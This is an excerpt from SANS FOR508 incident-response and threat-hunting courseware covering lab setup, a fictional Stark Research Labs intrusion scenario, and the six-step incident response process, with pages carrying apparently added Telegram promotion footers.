FOR508 | ADVANCED INCIDENT RESPONSE, THREAT HUNTING, & DIGITAL FORENSICS
GIAC Certified Forensic Analyst (GCFA)

508.1

.

Advanced Incident Response
and Threat Hunting

THE MOST TRUSTED SOURCE FOR INFORMATION SECURITY TRAINING, CERTIFICATION, AND RESEARCH

.

|

sans.org

© 2023 SANS Institute All rights reserved to SANS Institute.
PLEASE READ THE TERMS AND CONDITIONS OF THIS COURSEWARE LICENSE AGREEMENT ("CLA") CAREFULLY
BEFORE USING ANY OF THE COURSEWARE (DEFINED BELOW) ASSOCIATED WITH THE SANS INSTITUTE COURSE.
THIS IS A LEGAL AND ENFORCEABLE CONTRACT BETWEEN YOU (THE “USER”) AND THE ESCAL INSTITUTE OF
ADVANCED TECHNOLOGIES, INC. /DBA SANS INSTITUTE (“SANS INSTITUTE”) FOR THE COURSEWARE. BY
ACCESSING THE COURSEWARE, USER AGREES TO BE BOUND BY THE TERMS OF THIS CLA.
With this CLA, SANS Institute hereby grants User a personal, non-exclusive license to use the Courseware subject to the
terms of this agreement. Courseware means all printed materials, including course books and lab workbooks, slides or notes,
as well as any digital or other media, audio and video recordings, virtual machines, software, technology, or data sets
distributed by SANS Institute to User for use in the SANS Institute course associated with the Courseware. User agrees that
the CLA is the complete and exclusive statement of agreement between SANS Institute and you and that this CLA supersedes
any oral or written proposal, agreement or other communication relating to the subject matter of this CLA.
BY ACCESSING THE COURSEWARE, USER AGREES TO BE BOUND BY THE TERMS OF THIS CLA. USER FURTHER
AGREES THAT ANY BREACH OF THE TERMS OF THIS CLA MAY CAUSE IRREPARABLE HARM AND SIGNIFICANT
INJURY TO SANS INSTITUTE, AND THAT SANS INSTITUTE MAY ENFORCE THESE PROVISIONS BY INJUNCTION
(WITHOUT THE NECESSITY OF POSTING BOND) SPECIFIC PERFORMANCE, OR OTHER EQUITABLE RELIEF.
If User does not agree to the terms of this CLA, User should not access the Courseware. User may return the Courseware to
SANS Institute for a refund, if applicable.
User may not copy, reproduce, re-publish, distribute, display, modify or create derivative works based upon all or any portion of
the Courseware, in any medium whether printed, electronic or otherwise, for any purpose, without the express prior written
consent of SANS Institute. Additionally, User may not sell, rent, lease, trade, or otherwise transfer the Courseware in any way,
shape, or form to any person or entity without the express written consent of SANS Institute.
If any provision of this CLA is declared unenforc.eable in any jurisdiction, then such provision shall be deemed to be severable
from this CLA and shall not affect the remainder thereof. An amendment or addendum to this CLA may accompany this
Courseware.
SANS Institute may suspend and/or terminate User’s access to and require immediate return of any Courseware in connection
with any (i) material breaches or material violation of this CLA or general terms and conditions of use agreed to by User; (ii)
technical or security issues or problems caused by User that materially impact the business operations of SANS Institute or
other SANS Institute customers, or (iii) requests by law enforcement or government agencies.

.

SANS Institute acknowledges that any and all software and/or tools, graphics, images, tables, charts or graphs presented in
this Courseware are the sole property of their respective trademark/registered/copyright owners, including:
AirDrop, AirPort, AirPort Time Capsule, Apple, Apple Remote Desktop, Apple TV, App Nap, Back to My Mac, Boot Camp,
Cocoa, FaceTime, FileVault, Finder, FireWire, FireWire logo, iCal, iChat, iLife, iMac, iMessage, iPad, iPad Air, iPad Mini,
iPhone, iPhoto, iPod, iPod classic, iPod shuffle, iPod nano, iPod touch, iTunes, iTunes logo, iWork, Keychain, Keynote, Mac,
Mac Logo, MacBook, MacBook Air, MacBook Pro, Macintosh, Mac OS, Mac Pro, Numbers, OS X, Pages, Passbook, Retina,
Safari, Siri, Spaces, Spotlight, There’s an app for that, Time Capsule, Time Machine, Touch ID, Xcode, Xserve, App Store, and
iCloud are registered trademarks of Apple Inc.
PMP® and PMBOK® are registered trademarks of PMI.
SOF-ELK® is a registered trademark of Lewes Technology Consulting, LLC. Used with permission.
SIFT® is a registered trademark of Harbingers, LLC. Used with permission.
REMnux® is a registered trademark of Zeltser Security Crop. Used with permission.
VMware Workstation Pro®, VMWare Workstation Player®, VMWare Fusion®, and VMware Fusion Pro® are registered
trademarks of VMware, Inc. Used with permission.
Governing Law: This Agreement shall be governed by the laws of the State of Maryland, USA.
Courseware licensed to User under this Agreement may be subject to export laws and regulations of the United States of
America and other jurisdictions. User warrants he or she is not listed (i) on any sanction programs list maintained by the U.S.
Office of Foreign Assets Control within the U.S. Treasury Department (“OFAC”), or (ii) denied party list maintained by the U.S.
Bureau of Industry and Security within the U.S. Department of Commerce (“BIS”). User agrees to not allow access to any
Courseware to any person or entity in a U.S. embargoed country or in violation of a U.S. export control law or regulations.
User agrees to cooperate with SANS Institute as necessary for SANS Institute to comply with export requirements and
recordkeeping required by OFAC, BIS or other governmental agency.
All reference links are operational in the browser-based delivery of the electronic workbook.
FOR508_1_I01_01

.

Welcome to Advanced Incident
Response and Threat Hunting –
FOR508
• For Class Prep, you will need to find:
• Course Media “A” (ISO File)
• Workbook
• Before class starts, please complete:
• Lab 0
Install SIFT Workstation and 508 Windows VM
• Lab 1.1
Read the SRL Intrusion Scenario
• Course Dropbox Link: https://for508.com/dropbox-distance
• Extra Website Links: https://for508.com/links

.

Course Dropbox Link: https://for508.com/dropbox-distance
Extra Website links: https://for508.com/links

© 2023 SANS Institute

Join us now -> . | donate.. | t.me/Hide01 | t.me/RedBlueHit

1

.

This page intentionally left blank.

2

© 2023 SANS Institute

-> . |

. |

|

Lab 0
Before Class Begins: VM Installation

FOR508 | Advanced Incident Response,Threat Hunting, and Digital Forensics

3

.

This page intentionally left blank.

© 2023 SANS Institute

Join us now -> . | donate.. | t.me/Hide01 | t.me/RedBlueHit

3

Lab 1.1
APT Incident Response Challenge
Before Class Begins: Read Scenario

FOR508 | Advanced Incident Response,Threat Hunting, and Digital Forensics

.

This page intentionally left blank.

4

© 2023 SANS Institute

Join us now -> . | donate.. | t.me/Hide01 | t.me/RedBlueHit

4

How t o Approach Labs in FOR508

• Objectives
• Lab Preparation
• Questions
• Solutions
• Takeaways
• Optional Labs/Homework
• Precooked Output
FOR508 | Advanced Incident Response,Threat Hunting, and Digital Forensics

5

The FOR508 SRL Intrusion Lab Workbook is full of crucial information that will assist with course objectives
and provide guidelines and instructions for many investigations in the future.

.

To ensure you get the most out of each lab, we would like to step you through the different sections of the
workbook. The workbook is specifically designed to enable students from a variety of backgrounds and different
skill levels to get the most out of each lab.
Lab Objectives:
This section provides the bigpicture of what the lab is meant to show or teach. We might be demonstrating an
analytical technique or the specific output of a forensic tool. We strongly recommend you quickly look over
these objectives when beginningthe lab.
Lab Preparation:
Labs are designed to stand on thei rown. This allows students who are reviewing the labs to jump in without
necessarily having completed previous labs. We typically outline the specific system, the condition of that
system, or the capabilities that must be enabled before moving into the actual lab. Skipping over this step could
mean that your system might not be ready for analysis.
Questions without Explanations and Questions with Step-by-Step Instructions:
We want you to focus on the core concepts and analytical techniques of each lab instead of just running blindly
through a tool. Eventually, you will master the tool, but the most important part of this course, especially if you
are new, is to focus on the output of the tool and how to properly analyze it.
There are two parts to every lab:
1. Lab questions without any help or explanations.
2. Solutions with full step-by-step instructions and explanations.
For most students doing the lab for the first time, were commend liberally using the solutions to see the step-bystep instructions and explanations.

© 2023 SANS Institute

Join us now -> . | donate.. | t.me/Hide01 | t.me/RedBlueHit

5

Think of the labs as being accomplished in three ways. FOR508 is an advanced course, so we recommend
beginning or intermediate students approach labs as follows:
Gain familiarity: The first time through the lab students should liberally use the solutions to see the step-bystep instructions and familiarize themselves with the overall topic and techniques. Remember you are here to
learn, not to fight your system or become confused. You will get more from the lab by following along and
mimicking what you see directly while reading the full (and sometimes lengthy) explanations.
Gain mastery: When reviewing the lab again, we recommend using the “hybrid” approach. This approach
has you start with the part of the lab that has questions without any help or explanations, but then reference
the solutions when you get stuck. Students should be comfortable doing the labs themselves by the time they
reach the final capstone exercise, and the capstone systems will rely on the same procedures and techniques
found in the labs to provide more experience.
Achieve mastery: Once you can complete the lab without referencing the step-by-step information within the
solutions, you have mastered the skill. This is a great way to demonstrate you are ready to pass the
certification for this course. If you have already mastered the skills on labs from the start, it is likely you have
learned those skills already or know them from previous courses. It is also likely you already have the skills
needed to do Incident Response and Threat Hunting in the real world. Many students take a class to obtain
new skills, but the more advanced you get, the fewer new skills you will learn each time taking a course. We
aim for students to reach this stage after having completed the final capstone exercise, reviewing the labs a
few more times, and then testing themselves by completing the full lab without referencing the step-by-step
information within the solutions.
Takeaways:
For every lab, the takeaway section highlights important case-related artifacts we uncovered as a result of our
analysis. The takeaway section is important because these artifacts will build on one another as we progress
through the course. Sometimes it is hard to remember “How did we find pa.exe?” in a new lab that suddenly
asks you to use prior knowledge to look for something new. We advise regularly reviewing the takeaways from
each lab to refresh your memory of the ongoing incident we will be investigating.

.

Precooked Lab Output:
For every lab, there is a certain amount of “keyboard kung fu” necessary to complete the course. If you are
struggling with the seemingly never-ending command line input, we have relevant lab output pre-generated for
you within precooked folders:
FOR508 Windows VM: G:\precooked\<subfolder>
Linux SIFT VM: /cases/precooked/<subfolder>
Using the right techniques to approach the labs from the start is essential for your success in this course.
Everyone in the course is learning, so there is no reason to feel judged if you are regularly using the solutions
during each lab. Take advantage of the structure of the labs to facilitate the maximum learning possible for your
particular skill level and background. Enjoy!

6

© 2023 SANS Institute

Join us now -> . | donate.. | t.me/Hide01 | t.me/RedBlueHit

FOR508: What You Will Receive
SIFT Workstation Ubuntu Version
• Installed in Lab 0

FOR508 Windows VM
• Installed in Lab 0

Large collection of disk, memory, and triage images
• Supporting in-class labs and additional homework

Course Dropbox
• Reference documents
• Bonus labs
• https://for508.com/dropbox-distance

Course MP3 – Download via SANS Account Portal
• Available ~1 week after class
FOR508 | Advanced Incident Response, Threat Hunting, and Digital Forensics

7

.

We have worked hard in this class to provide students with the most up-to-date and relevant toolkit available.
You may be familiar with the SIFT Workstation, a Linux-based forensic distribution that has become a
mainstay in the forensic community. The SIFT project was the brainchild of Rob Lee and ismanaged by
Erik Kristensen on behalf of SANS and the entire forensics community. It takes hundreds of hours of work to
release each version and get the hundreds of embedded tools to play nicely with one another. While you will
be using the virtual machine version ofthe SIFT, you can now install SIFT on bare metal by installing
Ubuntu Linux and then adding the “SIFT package”.[1] Linux works efficiently even on older hardware, so if
you have an old system collecting dust in the closet, pull it out and make it a forensic workstation! However,
while taking this class, please use the virtual machines provided as they have been loaded with
additional files and are customized to support the labs.
You will also be using a Windows virtual machine. In this Windows version of the SIFT, we have enabled
the Windows Subsystem for Linux (WSL) capability for additional tool support and cross-platform
compatibility. This is an exciting leap forward by Microsoft, allowing both Windows and Linux tools to
natively co-exist. You will have many opportunities to see the benefits in action.
The data set you are provided with in this class was purposely designed to be larger than necessary. You will
have the opportunity to examine an entire production network of 30 systems and myriad host and memorybased forensic artifacts. This leaves many systems for you to continue your learning on long after class is
completed.
[1] SANS SIFT Documentation: https://for508.com/tz6ib

© 2023 SANS Institute

Join us now -> . | donate.. | t.me/Hide01 | t.me/RedBlueHit

7

FOR50
FOR508.1
8.1

Advanced Incident Response,Threat Hunting, and Digital Forensics

Advanced Incident
Response and Threat
Hunting
© 2023 SANS Institute | All Rights Reserved | Version I01_01

Welcome to FOR508! We are very excited to share this course with you. This begins Section One.

Rob Lee
rlee@sans.org
https://twitter.com/robtlee
https://twitter.com/sansforensics

.

Author team:

Chad Tilbury
ctilbury@sans.org
https://twitter.com/chadtilbury
Mike Pilkington
mpilkington@sans.org
https://twitter.com/mikepilkington

8

© 2023 SANS Institute

Join us now -> . | donate.. | t.me/Hide01 | t.me/RedBlueHit

FOR508 Course Agenda
Section 1: Advanced Incident Response and Threat Hunting
Section 2: Intrusion Analysis
Section 3: Memory Forensics in Incident Response and Threat Hunting
Section 4: Timeline Analysis
Section 5: Advanced Adversary and Anti-Forensics Detection
Section 6: APT Enterprise Incident Response and Hunting Challenge
FOR508 | Advanced Incident Response, Threat Hunting, and Digital Forensics

9

.

This page intentionally left blank.

© 2023 SANS Institute

Join us now -> . | donate.. | t.me/Hide01 | t.me/RedBlueHit

9

The Challenge of Information Security

FOR508 | Advanced Incident Response, Threat Hunting, and Digital Forensics

.

This page intentionally left blank.

10

© 2023 SANS Institute

Join us now -> . | donate.. | t.me/Hide01 | t.me/RedBlueHit

10

Detection Trends are Improving

•

We have seen massive improvements in
internal detection and dwell time

•

Result of improved DFIR, CTI, and Hunting

Mandiant M-Trends 2023

FOR508 | Advanced Incident Response, Threat Hunting, and Digital Forensics

11

FACT: Over the last decade, most organizations failed at detecting intrusions. However, we have seen dramatic
improvement as organizations begin to take incident response seriously and take a more active approach in threat
hunting.

.

The last decade has not been kind to network defenders. Our existing security models became defunct, and attackers
have used the enormous complexity of enterprise networks against us. But the tide is shifting. Statistics from Mandiant
M-Trends show a dramatic increase in internal detections, an excellent indicator for the increasing sophistication of
network defenders.[1] Dwell time, the time an attacker has remained undetected within a network, has also been
dramatically reduced.[1] Dwell time is a very important metric to track as it directly correlates with the ability of an
attacker to accomplish their objectives. When an organization gets attacker dwell time down to days or weeks, they are
mitigating attacks before attackers can complete their missions, with the added benefit of much less costly remediation
and recovery costs. On the flip side, attackers are also becoming more sophisticated. CrowdStrike reported the 2022
average “breakout” time for eCrime attackers was 84 minutes! [2] Breakout time is the time it takes an intruder to begin
moving laterally once they have an initial foothold in the network. As more organizations see highly targeted attacks,
breakout time has been greatly reduced. It takes a mature security team with exceptional network visibilityto keep
pace with top level threat actors.
[1] Mandiant M-Trends 2023: https://for508.com/h7nc5
[2] CrowdStrike Global Threat Report: https://for508.com/ka28j

© 2023 SANS Institute

Join us now -> . | donate.. | t.me/Hide01 | t.me/RedBlueHit

11

Threat Landscape

The Threats
• APT Nation-State Actors
• Organized Crime
• Hacktivists

The Reality
• Most organizations still have a difficult time responding
to intrusions from advanced adversaries
FOR508 | Advanced Incident Response, Threat Hunting, and Digital Forensics

.

Threats to the modern enterprise are legion and defending against the hordes of attackers can seem impossible.
Over the past decade, we have seen a dramatic increase in sophisticated attacks against organizations. Nationstate attacks originating from China and Russia, often referred to as Advanced Persistent Threat (APT) actors,
have proved difficult to suppress. Massive financial attacks from the four corners of the globe have resulted in
billions of dollars in losses. Ransomware and extortion became an existential threat almost overnight. While
the odds are stacked against us, the best teams out there are proving that these threats can be managed and
mitigated. The adversary is good and getting better. Are we learning how to counter them? Yes, we are.
This course was designed to help organizations increase their capability to detect andrespond to intrusions.
This is an achievable goal and begins by teaching you the tools and techniques necessary to find evil in your
network. Attackers have taken an early lead in this war, but there are many battles yet to be fought. We must
get to a point where most organizations can detect their own intrusions. Unlike other threats in society, there
is no one out there to come to your rescue. Law enforcement and government agencies are overwhelmed and
in this crucial part of the world economy, organizations largely need to fend for themselves. This course is
designed to make you and your organization an integral part of the solution. It is our hope that you can take
the concepts, tools, and techniques you learn here and apply them to make a difference. Get ready to hunt!

12

© 2023 SANS Institute

Join us now -> . | donate.. | t.me/Hide01 | t.me/RedBlueHit

12

SRL Intrusion Scenario

FOR508 | Advanced Incident Response,Threat Hunting, and Digital Forensics

13

.

This page intentionally left blank.

© 2023 SANS Institute

Join us now -> . | donate.. | t.me/Hide01 | t.me/RedBlueHit

13

Why Stark Research Labs?

FOR508 | Advanced Incident Response, Threat Hunting, and Digital Forensics

.

Stark Research Labs (SRL) has been the target of multiple very high-profile cyber-attacks in the last several
years. This is almost certainly due to it being a leading high-tech innovator focusing on biotech, metals research,
and advanced alloy generation, resulting in many innovations. SRL’s contributions have helped protect soldiers
on the battlefield, engineered new heavy space lift rockets, and contributed to many advanced weapons projects.
In intelligence circles there is much speculation around the latest initiatives and technologies on which Stark
Research Labs is focused. As a result, SRL has become a prime target of many state-sponsored adversaries
around the world.

14

© 2023 SANS Institute

Join us now -> . | donate.. | t.me/Hide01 | t.me/RedBlueHit

14

“I Have a Bad Feeling About This”

FOR508 | Advanced Incident Response, Threat Hunting, and Digital Forensics

15

.

Information technology staff at SRL started documenting unusual behavior on the corporate network during
January 2023. There were several sever anomalies reported, including the mail server, during which services to
both internal and external users were sporadically interrupted. Aftera few rounds of troubleshooting, IT began
to suspect malicious activity could be the root cause. These incidents reached a tipping point when a workstation
processing sensitive project data showed evidence of quarantined malware indicative of human-operated
activity.
On January 24, 2023, an incident was formally called and the SRL team began their incident response. IT
Admin Roger Sydow and IT Security Analyst Clint Barton initiated initial evidence collection steps against the
corporate network. The IT staff are veterans of multiple past intrusions into SRL and over time have architected
the network to facilitate visibility. Starting on January 24, 2023, F-Response agents were pushed to critical
systems to provide access to disk and memory for collection. Memory images were prioritized,starting with
RD01, the system where the anti-malware alerts initiated. As time permitted, additional memory images were
collected. Mr. Barton created multiple Velociraptor hunts to scope the extent of the intrusion. To augment these
hunts, a sweep of the environment using the Kansa PowerShell incident response framework was accomplished.
As the investigation continued to unfold, triage images and some full disk images were collected when feasible.
Due to the limited size of the team, evidence collection spanned multiple days. Initial analysis indicated several
hosts were likely compromised, and it quickly became clear SRL did not have sufficient staffing and expertise to
scope the intrusion fully. They ultimately decided to hire an outside consulting firm to complete the incident
response. Yourfirm was hired. Welcome to the team!
READ “LAB 1.1: APT INCIDENT RESPONSE CHALLENGE” FOR MORE DETAILS.

© 2023 SANS Institute

Join us now -> . | donate.. | t.me/Hide01 | t.me/RedBlueHit

15

Threat Intelligence: Crimson Osprey

• SRL is a government-sponsored R&D laboratory
• Diversified into many high-tech mission areas
• Gaining prominence in the World Security Council

• CRIMSON OSPREY threat actor recently identified
• Imminently targeting WSC parties
• Aggressive operating model
• Uses both commodity and custom tooling

• Multiple orgs in the WSC orbit have
reported similar tradecraft
FOR508 | Advanced Incident Response, Threat Hunting, and Digital Forensics

.

Stark Research Labs is a founding partner of the World Security Council (WSC), a global organization
dedicated to the safe development and deployment of advanced technologies to address emerging global
conditions. A recent briefing from the WSC threat intelligence team, known as “The Intelopes,” has identified a
previously-unknown threat actor code-named CRIMSON OSPREY. This threat grouping appears to be a statelevel adversary who has taken a particular interest in the WSC, their partners, and anyone with a connection that
could strengthen the alliance the WSC is forging. While it’s not clear if CRIMSON OSPREY is operating solely
and fully on behalf of any government, they are professional and quite successful—easily justifying the “statelevel” designation. CRIMSON OSPREY’s hallmark is aggressive and generally successful operations. It seems
they enjoy the benefit of advanced intelligence about their targets, as their actions on objective are quick and
decisive, albeit quite noisy. The Intelopes’ assessment is CRIMSON OSPREY benefits from the dwell time
between first incursion and their victim’s discovery of their presence. That discovery is often long after
successful exfiltration has been completed. Given the fact that the victim’s data is often lost before the incident
response team is even engaged, rapid identification and remediation of this threat actor is of utmost importance.
Multiple organizations, think tanks, and individuals in the WSC orbit have recently experienced intrusion events
sourced to this emerging threat actor.
This scenario is not only woven through the FOR508 course material, but is also shared with the SANS Institute
FOR572, Advanced Network Forensics course. We will be relying primarily on host-based evidence to
investigate the intrusion while FOR572 uses network source data.

16

© 2023 SANS Institute

Join us now -> . | donate.. | t.me/Hide01 | t.me/RedBlueHit

16

Stark Research Labs Network Diagram

FOR508 | Advanced Incident Response,Threat Hunting, and Digital Forensics

17

The SRL network is representative of many medium-sized enterprises. It has several major internal segments
separated by a firewall and DMZ. Once inside the perimeter, there are few network protections between hosts,
but host-based safeguards are in place. We will cover the network configuration in more detail in the next slide.

.

Their DMZ network consists of a web server, FTP server, SMTP server, and DNS server. The gateway firewall
provides inbound client-VPN access. Employees regularly utilize the VPN for remote work, with both user
authentication and client-side certificates required.
Internal Networks. Servers are divided between a management network, largely used for IT and security
operations, and a services network. Desktop systems are segmented into business operations and research and
development networks.
This slide shows an abridged SRL Network Map with the most important segments present. There is a digital
copy of this in the course dropbox and in the electronic workbook within your virtual machines.

© 2023 SANS Institute

Join us now -> . | donate.. | t.me/Hide01 | t.me/RedBlueHit

17

Stark Research Labs Domain Configuration

•
•
•

“SHIELDBASE” domain is on Windows Server 2022
Exchange 2019 on Server 2022 + M365 + OWA for email
Full auditing is turned on per recommended guidelines
Event log forwarding enabled
Win-RM fully enabled
All systems upgraded to PowerShell v5 + logging enabled
Fully patched systems at the time of the incident
Patches are automatically installed
Enterprise Incident Response agents installed
Enterprise endpoint security platform (Microsoft Defender)
Systems installed with common business software
Users are restricted to being users. They do not have administrative
rights on their systems.
Firewall blocks direct inbound and outbound traffic
Systems must connect through a proxy for web access
Unique strong passwords assigned to all local admin accounts
FOR508 | Advanced Incident Response,Threat Hunting, and Digital Forensics

Stark Research Labs Domain Configuration:
• The SHIELDBASE domain is on Windows Server 2022 (2022 Domain Functional Level)
• Full auditing is turned on per recommended guidelines. Event log forwarding is enabled, sending logs to the
"ELF01" server
• Win-RM is fully enabled to support PowerShell Remoting and Windows event log forwarding
• All systems are upgraded to PowerShell v5, and full PowerShell logging is enabled
• Systems were fully patched systems at the time of the incident. Patches are automatically installed.
• Enterprise endpoint security platform (Microsoft Defender)
• Security monitoring and threat hunting across the network (Velociraptor)
• Enterprise forensic capability (F-Response Enterprise)
• Exchange Server 2019 on Windows Server 2022, in addition to Microsoft 365 and "Outlook on the Web"
(OWA) for email access
• Desktop builds installed with common business software including Slack, Microsoft Teams, Microsoft
Office, Outlook, Chrome, and Microsoft Edge
• Firewall blocks direct inbound & outbound traffic for internal networks. Systems must connect through a
proxy for web access.
• Users are restricted to being users. They do not have administrative rights on their systems by default.
• Unique strong passwords assigned to all local admin accounts
• Administrators have both standard user and administration accounts (named with "-a") with segmentation of
duties enforced
• The SRL domain administrators are Roger Sydow (rsydow-a) and Clint Barton (cbarton-a)

.

•
•
•
•
•
•
•
•
•
•
•
•

18

© 2023 SANS Institute

Join us now -> . | donate.. | t.me/Hide01 | t.me/RedBlueHit

18

Advanced Incident Response and Threat Hunting Agenda

Incident Response & Threat Hunting
Threat Intelligence
Malware-ology
Malware Persistence
Incident Response: Hunting Across the Enterprise
Credential Theft
FOR508 | Advanced Incident Response, Threat Hunting, and Digital Forensics

19

.

This page intentionally left blank.

© 2023 SANS Institute

Join us now -> . | donate.. | t.me/Hide01 | t.me/RedBlueHit

19

Six-Step Incident Response Process
Preparation

Lessons
Learned/Threat
Intel
Consumption

Identification
and Scoping

Recovery

Containment/
Intelligence
Development

Eradication/
Remediation

FOR508 | Advanced Incident Response, Threat Hunting, and Digital Forensics

Computer intrusion incident response can be broken down into a six-step incident process. This model
originated from United States government agencies and has been extensively documented by the US National
institute for Standards and Technology (NIST).[1] It has a long and proven history of success and is a good
starting place to evaluate the steps required to respond and recover from an incident.

.

Overview of the Six-Step Incident Response Process
The six steps of this model are preparation, identification, containment, eradication, recovery, and lessons
learned.
Preparation
Incident response methodologies emphasize preparation—not only establishing a response capability so the
organization is ready to respond to incidents but also preventing incidents by ensuring that systems, networks,
and applications are sufficiently secure.
Identification
Identification is triggered by a suspicious event. This could be an alert from a security appliance, a call to the
help-desk, or the result of something discovered via threat hunting. Event validation should occur, and a
decision made as to the severity of the finding (not valid events lead to a full incident response). Once an
incident response has begun, this phase is used to better understand the findings and begin scoping the network
for additional compromise.
Containment and Intelligence Development
In this phase, the goal is to rapidly understand the adversary and begin crafting a containment strategy.
Responders must identify the initial vulnerability or exploit, how the attackers are maintaining persistence and
laterally moving in the network, and how command and control is being accomplished. In conjunction with
the previous scoping phase, responders will work to have a complete picture of the attack and often implement
changes to the environment to increase host and network visibility. Threat intelligence is one of the key
products of the IR team during this phase.

20

© 2023 SANS Institute

Join us now -> . | donate.. | t.me/Hide01 | t.me/RedBlueHit

20

Eradication and Remediation
Arguably the most important phase of the process, eradication aims to remove the threat and restore business
operations to a normal state. However, successful eradication cannot occur until the full scope of the intrusion
is understood. A rush to this phase usually results in failure. Remediation plans are developed, and
recommendations are implemented in a planned and controlled manner. Example changes to the environment
include:
•
•
•
•
•
•

Block malicious IP addresses
Blackhole malicious domain names
Rebuild compromised systems
Coordinate with cloud and service providers
Enterprise-wide password changes
Implementation validation

Recovery
Recovery leads the enterprise back to day-to-day business. The organization will have learned a lot during the
incident investigation and will invariably have many changes to implement to make the enterprise more
defensible. Recovery plans are typically divided into near-, mid-, and long-term goals, and near-term changes
should start immediately. The goal during this phase is to improve the overall security of the network and to
detect and prevent immediate reinfection. Some recovery changes could include:
•
•
•
•
•
•
•
•

Improve Enterprise Authentication Model
Enhanced Network Visibility
Establish Comprehensive Patch Management Program
Enforce Change Management Program
Centralized Logging (SIM/SIEM)
Enhance Password Portal
Establish Security Awareness Training Program
Network Redesign

.

Follow-Up
Follow-up is used to verify the incident has been mitigated, the adversary has been removed, and additional
countermeasures have been implemented correctly. This step combines additional monitoring, network sweeps
looking for new breaches, and auditing the network (penetration tests and compliance) to ensure new security
mechanisms are in place and functioning normally.
[1] NIST Computer Security Incident Handling Guide: http://for508.com/d0yft

© 2023 SANS Institute

Join us now -> . | donate.. | t.me/Hide01 | t.me/RedBlueHit

21

Eradication without Proper Incident Scoping/Containment
Preparation

Lessons
Learned/Threat
Intel
Consumption

Identification
and Scoping

Recovery

Containment/
Intelligence
Development

No Scoping = No idea
how deep intrusion
might be

No Containment
= Intrusion
“whack a mole”

Eradication/
Remediation

FOR508 | Advanced Incident Response, Threat Hunting, and Digital Forensics

22

.

The Problem? Immediate Eradication Without Proper Incident Scoping/Containment
A significant problem with the six-step incident response process is few teams follow the process as prescribed. There
is often intense pressure leading to a tendency to skip immediately to the “Eradication/Remediation” phase before true
scoping and understanding of the incident has occurred. While this makes it possible to begin remediation quickly,
what exactly is being fixed? Moving to eradication too early removes the benefits and capabilities provided by cyber
threat intelligence and intelligence-driven incident response doctrine.
A search of the NIST Computer Security Incident Handling Guide for the words “power,” “plug,” “reinstall,” or
“pulling” resulted in zero hits being found. Many organization’s incident response policies trend toward immediate
eradication through pulling the plug as their stop gap maneuver to prevent the additional spread of an attacker inside
their environment. Similar methods include blocking IP addresses, rebuilding systems, and disabling compromised
user accounts. While these actions prevent further attacks from that vector, they are unlikely to lead to full eradication
of the attacker. The problem lies in the fact that most organizations cannot detect an intrusion early enough to detect
the initial foothold and prevent it from being used to infect others. Statistics show that most intrusions have a dwell
time of weeks, months, or even years before detection. Reacting to an intrusion rapidly without following a well
thought out process leads to a situation many incident responders call “whack-a-mole”, as the organization blindly
chases the attacker throughout the network, making little overall progress.
Whack-a-mole response occurs when you move too fast toward eradication without proper cyber threat intelligence
helping direct containment and encirclement. Without good visibility and proper containment, the adversary is free to
redeploy assets around the network to ensure survivability. Removal of only a portion of adversary-controlled
infrastructure results in little progress and by the time your IR team is done patting itself on the back with a “job well
done”, the adversary will be back compromising additional systems.
What drives the immediate eradication/remediation call to arms? Many organizations fear losing the data stored on the
system to the adversary. The data may be deemed as simply too valuable and the risk too high. As a result, many IR
teams know it is a bad idea to remediate too early but are compelled to do so by management’s fear of the horse
leaving the barn. But as the analogy goes, closing the barn door after the horses have been let out is useless. Rushing
to eradicate at this stage can also lead the attacker to react your remediation actions before you are prepared to
counteract. They might assume your actions are the beginning of a full-scale remediation and begin a major
22

© 2023 SANS Institute

Join us now -> . | donate.. | t.me/Hide01 | t.me/RedBlueHit

exfiltration or destructive process on other systems they control. This act/react/counteract model is the norm for
intrusion response. As a result, the better you can scope your incident and learn about your adversary, the more
eventual control you will have over the results.

.

Bottom line: Do not react too quickly to an incident by pulling the power. Teams need to move toward
intelligence-driven incident response.

© 2023 SANS Institute

Join us now -> . | donate.. | t.me/Hide01 | t.me/RedBlueHit

23

Containment and Intelligence Development

Intelligence Development
Tools, techniques, and procedures
observation

Containment/
Intelligence
Gathering

Containment / Active Defense
“Prevent or slow additional access during
monitoring and collection phase”
Full-scale host/network monitoring
Data decoy
Bit mangling

Understanding adversary intent
Malware gathering
IOC development

Traffic shaping
Adversary network segmentation
“AVOID PLAYING YOUR HAND”

Campaign identification

FOR508 | Advanced Incident Response, Threat Hunting, and Digital Forensics

.

The bulk of response time is often spent in the containment and intelligence development phase of the incident
response cycle. This is where responders learn about an ongoing attack and ultimately unravel the intentions of the
attacker. The need for threat intelligence collection during an attack cannot be overstated. If you are not collecting
information on attacker activity, you are starting from the absolute beginning in every investigation. Intelligence
helps guide your network and host sweeps, facilitating rapid identification of additional compromised hosts in your
environment. For example, if you find an instance of evil.exe in an unusual directory on a system, it is likely the
adversary also placed a similar file in the same directory on another system. This is called an indicator of
compromise, or an IOC. IOC development is extremely important at this phase because it is a force multiplier,
ensuring the massive effort of finding suspicious activity can be automatically replicated across the enterprise.
Keep in mind that an indicator does not have to be malware, and with today’s advanced attackers, may be
legitimate system tools and commands. A compromised host could be any system that the adversary has examined,
utilized, or infected during their campaign. Eventually, with enough intelligence data, predicting an adversary’s
intent and future actions is possible. When this point is reached, it is time to consider moving to the eradication and
remediation phase.
As the incident response team learns more about the attack and adversary, a window opens allowing containment
actions to occur. As an example, intelligence collection can allow teams to predict the type of data an attacker is
searching for, leading to additional security capabilities built around systems housing that type of data. The goal of
containment is to degrade the capabilities of an adversary, denying them the opportunity to achieve their goals.
Containment is not the end game, but it can be used sparingly to provide breathing room to the incident response
team until they can enact a permanent eradication and remediation plan. During an intrusion, the more you can
learn about your adversary’s capabilities and true intent, the easier it is to achieve containment. For example, if the
adversary simply wants to steal intellectual property and spy on your organization, limiting the adversary from
exfiltrating the stolen data would prevent them from achieving operational success. Any technique you employ to
restrict, limit, and degrade the capabilities of your adversary while moving around the network, collecting data, and
exfiltrating would be considered part of containment.
The course authors learned back in 1998 while responding to one of the earliest nation-state attacks, “Moonlight
Maze”, that anytime responders react too quickly to an intruder, the attackers will have an equal response. [1] In
some cases, the Russian-based actors would go dormant for months and resurface on the same network once
24

© 2023 SANS Institute

Join us now -> . | donate.. | t.me/Hide01 | t.me/RedBlueHit

24

they felt they were not being searched for any longer. This led us to begin heavy monitoring with a kill switch.
Essentially, we used a bridging firewall to segment compromised network segments and systems that the
Russian APT was targeting. If they began to collect data for exfiltration or attempted something we didn’t like,
we dropped the connection or temporarily blocked the network. We broadcasted many reasons for the
“downtime” in case the intruder suspected they were being watched. On the flip side, we also learned attackers
